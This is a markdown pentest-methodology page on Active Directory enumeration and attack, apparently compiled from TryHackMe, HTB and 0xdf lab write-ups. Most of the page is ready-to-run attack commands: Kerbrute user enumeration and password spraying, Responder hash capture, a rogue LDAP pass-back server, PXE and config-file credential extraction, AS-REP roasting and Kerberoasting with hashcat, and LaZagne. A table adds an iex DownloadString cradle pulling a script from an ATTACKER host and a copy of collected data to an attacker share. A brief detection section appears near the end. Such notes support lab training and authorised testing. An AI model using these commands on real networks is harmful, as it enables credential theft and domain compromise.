---
title: "Active Directory Enumeration"
type: technique
tags: [0xdf, active-directory, enumeration, htb, post-exploitation, thm, windows]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-ad-enumeration, thm-ad-breaching, cpts-password-attacks, 0xdf-windows-ad]
---

# Active Directory Enumeration

## What it is

Active Directory enumeration is the process of mapping the domain structure, user accounts, group memberships, computer objects, trusts, and access control configurations after gaining an initial foothold. The goal is to identify attack paths toward Domain Admin or other privileged targets.

## How it works

AD exposes its object model through several protocols: LDAP (port 389/636), Kerberos (88), SMB (445), and RPC. Attackers use these to query the domain directory. Many queries require only a standard domain user account — no elevated privileges are needed for most enumeration techniques.

## Prerequisites

- Any valid domain user credential (even low-privileged)
- Network access to a Domain Controller (or domain-joined machine)
- For BloodHound SharpHound collection: PowerShell execution on domain-joined host
- For LDAP queries from Linux: `ldapsearch` and DC IP

## Methodology

### 1. Basic net commands (built-in Windows)

```cmd
# List all domain users
net user /domain

# Enumerate a specific user
net user zoe.marshall /domain

# List all domain groups
net group /domain

# List members of a specific group
net group "Domain Admins" /domain
net group "Tier 1 Admins" /domain

# Password policy (lockout threshold, complexity)
net accounts /domain
```

### 2. PowerShell AD module (RSAT)

```powershell
# Enumerate a user (all properties)
Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *

# Search users by name pattern
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A

# Enumerate groups
Get-ADGroup -Identity Administrators -Server za.tryhackme.com -Properties *

# Get group members
Get-ADGroupMember -Identity "Domain Admins" -Server za.tryhackme.com

# Objects changed after a date (change detection)
$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com

# Find accounts with bad password count > 0 (spray avoidance)
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com

# Domain info
Get-ADDomain -Server za.tryhackme.com

# Force-change password (post-exploitation ACL abuse)
$Password = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
Set-ADAccountPassword -Identity victim_user -Reset -NewPassword $Password
```

### 3. Username enumeration with Kerbrute

```bash
# Generate username list from real names
./username-anarchy -i /home/user/names.txt

# Enumerate valid usernames without password (Kerberos AS-REQ)
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

# Output: [+] VALID USERNAME: bwilliamson@inlanefreight.local
```

### 4. Credential spraying (AD user enumeration via login)

```bash
# NetExec SMB spray — valid accounts show +
netexec smb 10.129.201.57 -u usernames.txt -p 'ChangeMe123!'

# Kerbrute spray (quieter, avoids SMB logging)
./kerbrute_linux_amd64 passwordspray --dc 10.10.10.1 --domain DOMAIN.local usernames.txt 'Password123'

# NTLM web application spray
python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
```

### 5. BloodHound / SharpHound collection

```powershell
# Run SharpHound data collection (from domain-joined Windows)
SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
# Produces a .zip file with JSON graph data
```

```bash
# Import into BloodHound (on Kali)
neo4j start
bloodhound
# Upload the .zip via "Upload Data"
```

**Key BloodHound queries:**

```cypher
-- Find all Domain Admins
MATCH (n:Group) WHERE n.name =~ "(?i)DOMAIN ADMINS.*" WITH n MATCH (u)-[r:MemberOf*1..]->(n) RETURN u,r,n

-- Shortest path to Domain Admin from owned user
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

-- Find computers where owned users are local admin
MATCH p=(u:User {owned:true})-[:AdminTo]->(c:Computer) RETURN p

-- Computer accounts with AdminTo relationship (for relay attacks)
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p

-- Kerberoastable users
MATCH (u:User) WHERE u.hasspn=true RETURN u.name,u.serviceprincipalnames
```

### 6. ldapsearch from Linux
```bash
# Enumerate domain users
ldapsearch -H ldap://10.10.10.1 -x -D "user@domain.local" -w 'Password' -b "DC=domain,DC=local" "(objectClass=user)" cn sAMAccountName

# Find all groups
ldapsearch -H ldap://10.10.10.1 -x -D "user@domain.local" -w 'Password' -b "DC=domain,DC=local" "(objectClass=group)" cn

# Check supported SASL mechanisms (for LDAP pass-back)
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

### 7. NetExec enumeration

```bash
# Enumerate shares
netexec smb 10.10.10.1 -u user -p 'Password' --shares

# Enumerate logged-in users
netexec smb 10.10.10.1 -u user -p 'Password' --sessions

# List domain users
netexec smb 10.10.10.1 -u user -p 'Password' --users

# List domain groups
netexec smb 10.10.10.1 -u user -p 'Password' --groups
```

### 8. Breaching AD — initial credential sources

#### NTLM Responder (authentication relay / capture)

```bash
# Capture NTLMv2 hashes from broadcast traffic
sudo responder -I eth0

# Hash appears as:
# [SMB] NTLMv2-SSP Username: ZA\svcFileCopy
# [SMB] NTLMv2-SSP Hash: svcFileCopy::ZA:<challenge>:<response>:<blob>

# Crack captured NTLMv2 hash
hashcat -m 5600 captured_hash.txt passwords.txt
```

#### LDAP Pass-back (network devices / printers)

```bash
# Set up rogue LDAP server to capture cleartext credentials
sudo apt-get install slapd ldap-utils
sudo dpkg-reconfigure -p low slapd

# Create file to strip encryption enforcement
cat olcSaslSecProps.ldif
# dn: cn=config
# replace: olcSaslSecProps
# olcSaslSecProps: noanonymous,minssf=0,passcred

sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

# Listen for credentials
sudo tcpdump -SX -i eth0 tcp port 389
# Point target device's LDAP server setting to your IP
```

#### MDT/PXE credential extraction

```powershell
# Download BCD file from PXE server
tftp -i <MDT_IP> GET "\Tmp\x64{GUID}.bcd" conf.bcd

# Parse with PowerPXE to find WIM path
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile

# Download WIM and extract credentials
tftp -i <MDT_IP> GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
Get-FindCredentials -WimFile pxeboot.wim
```

#### Configuration file credentials

```bash
# McAfee agent database
scp thm@TARGET:C:/ProgramData/McAfee/Agent/DB/ma.db .
sqlitebrowser ma.db
# Decrypt found password
python2 mcafee_sitelist_pwd_decrypt.py '=jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
```

### 9. AS-REP Roasting (pre-auth disabled accounts)

```bash
# Find accounts with "Do not require Kerberos pre-authentication"
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Request AS-REP hash (no credentials needed)
python3 GetNPUsers.py domain.local/ -dc-ip 10.10.10.1 -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hashes

# Crack the hash (mode 18200)
hashcat -a 0 -m 18200 asrep.hashes rockyou.txt
```

### 10. Kerberoasting

```bash
# Request TGS for service accounts (any domain user can do this)
python3 GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1 -request -outputfile tgs_hashes.txt

# Crack (mode 13100 for RC4, 19600 for AES256)
hashcat -a 0 -m 13100 tgs_hashes.txt rockyou.txt
```

### 11. Domain trust enumeration

```powershell
# Built-in
nltest /domain_trusts

# PowerShell
Get-ADTrust -Filter *

# BloodHound — shows trust edges between domains
```

### 12. Credential hunting on Windows

```powershell
# Search file system for password strings
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# LaZagne — browser, application, LSA credential extraction
start LaZagne.exe all

# Enumerate Windows Credential Manager
cmdkey /list
# Use stored credential
runas /savecred /user:DOMAIN\user cmd
```

## Key payloads / examples

```powershell
# Rapid domain overview (PowerShell one-liners)
Get-ADUser -Filter * | Select-Object Name,SamAccountName,Enabled | Export-Csv users.csv
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name,SamAccountName
Get-ADComputer -Filter * | Select-Object Name,DNSHostName,OperatingSystem
```

```bash
# Username generation from full names
./username-anarchy John Marston > usernames.txt
./kerbrute_linux_amd64 userenum --dc 10.10.10.1 --domain DOMAIN.local usernames.txt
```

## From the Wild — BloodHound-first workflows (HTB, 0xdf)

Twenty-plus Windows boxes in `raw/research/0xdf-htb/` are tagged `bloodhound` or collected with SharpHound or BloodHound.py. Patterns below summarise how enumeration and graph reasoning chain into the next exploit. Cross-read [[kerberos-attacks]], [[ad-lateral-movement]], and [[adcs]] for ticket and certificate specifics.

### Collection matrix (credential vs foothold)

| Situation | Collector | Typical invocation |
|-----------|-----------|---------------------|
| PowerShell foothold ([[evil-winrm]], WinRM PS) | `SharpHound.ps1` / `invoke-bloodhound` | `iex(New-Object Net.WebClient).DownloadString('http://ATTACKER/SharpHound.ps1')` then `Invoke-BloodHound -CollectionMethod All -Domain CORP.LOCAL -LDAPUser svc -LDAPPass pass` (HTB Forest-style) |
| Same, binary from SMB share | `SharpHound.exe` | Run from UNC path so output lands on attacker share (`\\ATTACKER\share\SharpHound.exe`). Default zip name `*_BloodHound.zip` (HTB Sauna, MultiMaster). |
| Creds only, Linux attacker | BloodHound.py (`bloodhound-python`) | `bloodhound-python -c ALL -u user -p pass -d domain.local -dc dc01.domain.local -ns 10.10.10.x` DNS server `-ns` must resolve the `-dc` hostname (HTB Blackfield, Intelligence, Search, Pivotapi, Support). Narrow collection if timeouts: `-c Group,LocalAdmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn` (HTB Rebound). Kerberos LDAP: `-k` with synced clock. Output: `*.json` or `--zip`. |
| Creds via [[netexec]] | Module `--bloodhound` | `netexec ldap DC -u user -p pass --bloodhound -c All --dns-server DC_IP` creates a zip under `~/.nxc/logs/` (VulnLab Delegate-style). |

Operational tips from writeups:

- Prefer **SMB exfil**: `copy *_BloodHound.zip \\ATTACKER\share\` or Impacket `smbserver.py` with credentialed `net use`.
- BloodHound.py on modern Python stacks may need `pipx install bloodhound` or Python 2-era env; `-dc` is a **hostname**, not an IP.

### Analysis loop operators repeat

1. **Upload Data** (`*.zip` or all `*.json`).
2. **Mark user(s) owned** after each foothold tier (multi-user chains: HTB MultiMaster, Rebound, Search).
3. Start graph from owned principal: canned **Shortest Paths to Domain Admins**, **Outbound Object Control**, or **First Degree Object Control** on user nodes.
4. Right-click edges, open **Help** then **Abuse Info** for PowerShell / net commands (BloodHound documents DCSync, group membership ACL abuse, delegation edges).
5. **Re-ingest after privilege change**: same collection with higher account may expose GMSA, delegation SPNS, or extra edges invisible to weak LDAP context (HTB Intelligence as `Tiffany.Molina` vs `Ted.Graves`).

### Supplemental Cypher (BH CE / Legacy)

Starter patterns after ingest; confirm property names against your BloodHound CE / legacy build.

```cypher
MATCH (u:User {owned:true})
OPTIONAL MATCH (u)-[:MemberOf*1..]->(g:Group)
RETURN u.name, collect(DISTINCT g.name)[..25] AS group_path

MATCH (x:User) WHERE x.hasspn=true AND COALESCE(x.admincount,false) <> true AND COALESCE(x.enabled,true) <> false
RETURN x.name, x.serviceprincipalnames
```

### Machine reference — what BloodHound surfaced next

Representative chains from sampled writeups (~20 machines across Easy to Hard):

| Box | Cred / foothold | Graph highlight | Next technique |
|-----|----------------|-----------------|----------------|
| Forest | svc-alfresco WinRM | Nested groups imply **Account Operators**; **GenericAll** on group **Exchange Windows Permissions**; **Help** hints `Add-DomainGroupMember` + DACL granting **DCSync** | Join group, grant self **DCSync** on domain, dump with `secretsdump.py` ([[kerberos-attacks]]) |
| Sauna | svc\_loanmgr | **Outbound Object Control**: **GetChanges** + **GetChangesAll** on domain (DCSync rights) | `secretsdump.py` or `lsadump::dcsync` without further ACL edits |
| Blackfield | support | **First Degree**: **ForceChangePassword** on `AUDIT2020` | `rpcclient` **setuserinfo2** … **23**, then forensic share and LSASS dump path |
| Intelligence | Tiffany.Molina, later Ted.Graves | Early ingest sparse; rerun shows **GMSA** read / delegation prerequisites; SPNS in node **Details** pane | **`msDS-ManagedPassword`**, constrained delegation hops |
| MultiMaster | several owned principals | Mark all owned → **Shortest Paths to High Value Targets** → abuse edges with bypassed AMSI wrapped **PowerView** | ACL and group escalation |
| Pivotapi | SQL-linked Windows users | Locate **svc\_**, **Remote Management Users** memberships in `users.json` | WinRM hops into domain |
| Search | hope.sharp | Kerberoastable users enumerated in ingest; BH guides next hop toward **GMSA / domain admin chain** after cred spray | Rotate collection per new user |
| Rebound | oorend | Large graph: bad ACL on group grants control over accounts with shadow creds / WinRM; BH supports **delegation edge** enumeration alongside `findDelegation.py` | Constrained delegation + **RBCD** to DC backup account (see [[kerberos-attacks]]) |
| Delegate (VulnLab) | tier-1 domain user | **netexec ldap --bloodhound** zip into BloodHound CE UI | Abuse **SeEnableDelegationPrivilege**, configure delegation |

For ticket-level detail after BH flags **delegation** or **DCSync**, use [[kerberos-attacks]]. For [[adcs]] template and relay pivots surfaced in BH, use [[certipy]] and [[adcs]].

## Detection and defence

- Monitor LDAP queries for bulk enumeration (large result sets from non-admin accounts)
- Monitor Kerberos TGS requests for service accounts (Kerberoasting: Event ID 4769)
- Monitor Event ID 4771 (Kerberos pre-auth failure) for spray detection
- Enable Advanced Audit Policy for DS Access
- Use honeypot accounts (fake service accounts with SPNs) to detect Kerberoasting
- Alert on unusual `net user /domain` or PowerShell AD module usage

## Tools

- BloodHound — Graph-based AD attack path visualisation
- SharpHound — BloodHound data collector
- Kerbrute — Username enumeration and Kerberos spray
- NetExec — SMB/LDAP/WMI enumeration and spray
- Responder — NTLMv2 hash capture via broadcast protocol poisoning
- Impacket — GetNPUsers, GetUserSPNs (AS-REP/Kerberoasting)
- Mimikatz — Local credential extraction
- LaZagne — Application credential extraction
- PowerView — PowerShell AD enumeration (PowerSploit)
- username-anarchy — Username generation from real names

## Sources

- THM Windows RED — Enumerating AD
- THM Windows RED — Exploiting AD
- THM PT1 Prep — AD Breaching (NTLM services, LDAP pass-back, MDT, config files)
- CPTS Password Attacks — Dictionary attacks against AD, Kerbrute, NTDS.dit
- HTB Linux and Windows Active Directory methodology writeups aggregated as `0xdf-windows-ad`

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[active-directory-integrated-dns-adidns]]
- [[active-directory-linux]]
- [[active-directory-recycle-bin]]
- [[password-ad-user-comment]]
- [[powershell]]
- [[trust-relationship]]
